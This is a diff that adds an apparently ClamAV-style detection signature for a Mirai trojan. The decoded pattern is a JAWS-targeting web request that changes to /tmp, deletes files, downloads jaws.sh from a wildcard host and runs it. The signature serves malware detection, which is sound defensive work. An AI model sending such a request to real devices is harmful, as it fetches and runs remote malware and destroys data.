@@ -1,0 +1,5 @@
+VIRUS NAME: Unix.Trojan.Mirai-6630650-0
+TARGET TYPE: ELF
+OFFSET: *
+DECODED SIGNATURE:
+GET /shell?cd+/tmp;rm+-rf+*;wget+http://{WILDCARD_ANY_STRING(LENGTH>=7&&<=16)}/jaws.sh;sh+/tmp/jaws
